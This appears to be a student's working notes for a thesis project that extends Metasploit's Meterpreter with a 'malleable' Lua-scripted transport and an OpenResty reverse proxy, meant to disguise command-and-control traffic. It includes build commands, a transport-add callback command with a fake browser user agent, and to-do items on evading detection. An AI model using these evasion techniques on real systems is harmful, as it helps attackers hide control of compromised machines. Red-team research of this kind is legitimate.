# BA Timo

# Goals

Meterpreter output in base64 encoded encrypted "viewstate"

## Debugging

Copy new dlls into metasploit directory
```
rm ~/Tools/bachelor_metasploit/metasploit-framework/data/meterpreter/*.dll; cp /mnt/hgfs/Shared_Folder/bachelor/vs_output/x64/* ~/Tools/bachelor_metasploit/metasploit-framework/data/meterpreter/; ./msfconsole -r ~/Projects/bachelor/msf.rc
```

Run metasploit auto create payload and start handlers
```bash
 ./msfconsole -r ~/Projects/bachelor/msf.rc 
```

Write .dll(s) into `/home/timo/Tools/bachelor_metasploit/metasploit-framework/data/meterpreter`
When creating payload it uses the ones in this directory first

# Links









[Build tutorial](https://www.youtube.com/watch?v=de-UYWnafow)

[Run extension before connection is established](https://github.com/rapid7/metasploit-framework/wiki/Python-Extension#stageless-initialisation)

[Create extensions](https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter#creating-extensions)



[LUA performance tipps](https://www.lua.org/gems/sample.pdf)
[LUA Base64](http://lua-users.org/wiki/BaseSixtyFour)
[LUA Binary](https://sourceforge.net/projects/luabinaries/files/5.3.4/Windows%20Libraries/Dynamic/)
[winhttp1](https://docs.microsoft.com/de-de/windows/desktop/WinHttp/winhttp-sessions-overview#Posting_data_to_the_)
[winhttp2](https://docs.microsoft.com/de-de/windows/desktop/WinHttp/winhttp-sessions-overview#Downloading_resource)





[LUA Base64 encoder/decoder](https://github.com/ErnieE5/ee5_base64)

# Goals



# Compile extension

1. Follow this tutorial for the dll creation [Create extensions](https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter#creating-extensions) but carefull, I had to copy a working extension because an error during linking (file not found) was thrown

# TODO UPDATE THIS LIST

2. Following files are most likely needed 
```bash
./data/meterpreter/ext_server_malleable.x64.dll # This one is our compiled dll which will be injected into meterpreter
./lib/rex/post/meterpreter/ui/console/command_dispatcher/malleable.rb # In here we define commands (in meterpreter session "help") and helptext we also call functions here (which are defined in the "extensions" directory). Also I think some UI cleanup/manage stuff

./lib/rex/post/meterpreter/extensions/malleable/malleable.rb # # In here we implement the logic for the functions we can call through the UI. Also we send the actual requests to the server

./lib/rex/post/meterpreter/extensions/malleable/tlv.rb # I think this has to do with obfuscating traffic. Data saved in TLV variables are obfuscated to some extend. TLV can be appended to Requests and sent out
```

2. Delete old meterpreter dll, copy new into metasploit directory, start msfconsole with resource file
```
rm /home/timo/Tools/bachelor/metasploit-framework/data/meterpreter/*.dll; cp /mnt/hgfs/Shared_Folder/bachelor/vs_output/x64/* /home/timo/Tools/bachelor/metasploit-framework/data/meterpreter/; ./msfconsole -r ~/Projects/bachelor/msf.rc
```

3. Check if generate function with extinit works

4. Check if loading function in metasploit works

5. Check if loading function works in meterpreter



# Notes

Meterpreter is always called the server and metasploit always called the client

Set log level in Metasploit `setg LogLevel 3`

Open all important client side files
```bash
subl ./lib/rex/post/meterpreter/extensions/malleable/tlv.rb
subl ./lib/rex/post/meterpreter/extensions/malleable/malleable.rb
subl ./lib/rex/post/meterpreter/ui/console/command_dispatcher/malleable.rb
``` 

# Options to handle the obfuscation problem

* DLL inject and overwrite sending functions (what about tlvs? Can we do this?)

* Create clone of http meterpreter (most likely least initial effort, but need to manually update in the future)

* Change original meterpreter code and make a check if extension is loaded

* Create own transport (Probably wrong place to change these things)

* is there a functionality which is checked called beforehand?

* ask OJreeves for an idea

# reverse proxy

Decisions: evilginx(1\|2) or openresty (vor nachteile usw....)

Decided for openresty
```
sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 -it myopenresty
```

# Problems

* Extint not working (preload extension before any communication)

* XOR key applied to packets, looks suspicious

* We cant use tlv functionality, to send the obfuscated packet we need to hook right before the packet send function

* elua for better performance, because LUA needs a while to close. (In BA write about multiple possibilities and why I've chosen LUA)

* Lua script error handling with automatic fallback 

* Get loaded commands/DLL/extensions

* Check advanced options in payload (e.g. allowdirectreverseProxy)

* SSL

* Stageless problems? especially with reverse proxy

* malicously crafted packets which will get parsed by lua

* which lua version has openresty and which one has meterpreter?

* Check how reverse proxy works back

* Slim LUA framework

* Free pointer in server_transport_winhttp.c

* Don't save lua file on system

* Is this filter needed?

* validate lua script

* lua script through string limited to xx thousand characters (under 20k ober 10k) (also formatting is shit)

* change in lua script "encrypt" to "encode"

* how to make c implementation of malleable as flexible as possible

* if we want to make real website we have to check how to differenciate inbetween meterpreter and normal user (filter it when encoding decondign in reverse proxy!) (mby header)

* Fix import slashes (/ and \\ )

* Add and use transport when malleable is loaded

* Deconstructor which deloads malleable 

* meterpreter stürzt ab?

* how to implement lua libraries (from setscript or so)

* which lua version on openresty?

* upstream prematurely closed connection while reading response header from upstream,

* Lock until setstring is completed

* check if body nil in lua

* difference vdprintf and dprintf

* for malloc and stuff check if enough memory available

* Check why bare extension is not working

* Only encode response when the  incomming packet was also encoded

* Recieving packages on meterpreter is complicated, we first read decode validate the header of the package, then we read the payload in chunks. With the current implementation we would need to read the entire body at once to have a sensible, easy, "high level" possibility for dynamic LUA scripts. We would probably need to override method handles in the the transport, depending if malleable extension is loaded. (The method handles are ind  the last 20 lines of `server_transport_winhttp.c`) So now we try to implement a new transport instead of a malleable extension.

* When implementing a transport we have to check if we keep the LUA approach  on the client side, or if we want to decode the pacakages in ruby. (Client: Ruby, Server: C with LUA interpreter) || (Client: Ruby with LUA interpreter, Server: C with LUA interpreter)

* Bunch of stuff copied from `server_transport_http` to `server_transport_http_malleable`, we are overriding tons of `transport->` and `ctx-> ` in (line 900+) mby we need ot only override the things in `transport_move_to_malleable` though (as seen in wininet)

* Keep malleable in an extension so we don't ~HAVE~ to ship LUA with every Meterpreter and transport?

* Make extra malleable transport flag, `base_dispatch.c` line 19 would probably be a good start

* Anstatt derzeitiger loesung mit flag die umschaellt wie bei wininet, neue loesung mit url mhttp!!!

* transport_config.rb lets us see how scheemes (and transports?) are set

* test with initial malleable transport and with added malleable transport

* if transport cant be initialized (and we have no valid transports we nuke the CPU) `transport initialization failed, moving to the next transport`

* own transport works now, need to check if CHANGING into the transport works aswell. (as initial transport version it works (in metasploit framework `setg OverrideScheme mhttp`))

* need to readd lua interpreter in own transport, then need to rewrite recieve and send functions to encode and decode (and need to add lua in ruby)

* Minimize LUA

* port to 32 bit

* test on multiple different windows versions

* does malleable work with wininet transport?

* check all mallocs, realloc, ... if out of memory is properly handled!!!

* remove unused includes and defines

* Es gibt einen ort wo cases gecheckt werden (malleable hat 0x28), wie wo wird das verwendet?

* Implement the error handling we didn't copy (from server_transport_winhttp_malleable read_response rewrite)

* Check behaviour if wrong packages are incoming

* checkup on the holy if statement (within the malleable transport, the if statement which does crash the create_transport() if it's not there)

* Impelment set lua script in transport

* Code cleanup on reading 

* User agent is not displayed (saved?) when changing transports

* difference initial transport and transport switching

*  in `lib/rex/payloads/meterpreter/config.rb` there is no size restriction/check (for example in `to_str(item,size)`)

* what happens with specific byte sequences (edge cases) in lua?

* Grafik welche darstellt wie die config erstellt wird (mit padding und so) siehe config.h

* what happens if response/request body is extremely big? (e.g big ls or upload of file)(maybe a lua nginx problem there)

* Carefull in regex, buffer can have random characters which are catched by regex

* test if all extensions are loadable

* mby two new lines at end of base64 encoded stuff?

* Change User Agent to something else

* Use winapi within lua to do things like base64 encoding

* check android payload???

* msfvenom payload generation!!

* Fallback if malleableTransport fails

* Update and clean dockerfile

* config size problem

* remove prints from lua scripts

* Test the unit tests

* Handle GET requests in openresty decode (at the moment we can't change uris, only body content)

* Virustotal anschauen

* The LUA unit testing is kinda funky with the base64 decode library. The `require` base path is set, as it would be used within the docker container. While this file doesn't exist on the unit test system it still works as long as it's in the same directory as the tested scripts.

* change transport implementation

# Bisherige Schritte

1. Basic functionality Extension zum laufen gebracht
2. Lua zum laufen gebracht
3. Reverse proxy aufgesetzt (openresty)
4. Integrated LUA dll into meterpreter
5. Make LUA take script string

# Notes

* `/home/timo/Tools/bachelor/metasploit-framework/lib/rex/post/meterpreter`

* `transport add -t reverse_mhttp -l 192.168.42.131 -p 5555 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`

 Payload generation failed: comparison of Integer with nil failed

 git remote add upstream git://github.com/rapid7/metasploit-framework.git
git fetch upstream
git pull upstream master

to copy the custom .dlls to the linux system and build the meterpreter in metasploit-framework we need to run `buildAndCopyMeterpreter.sh`

## Server send response

/home/timo/Tools/bachelor/metasploit-framework/lib/rex/proto/http/server.rb:39

# * Anstatt derzeitiger loesung mit flag die umschaellt wie bei wininet, neue loesung mit url mhttp!!!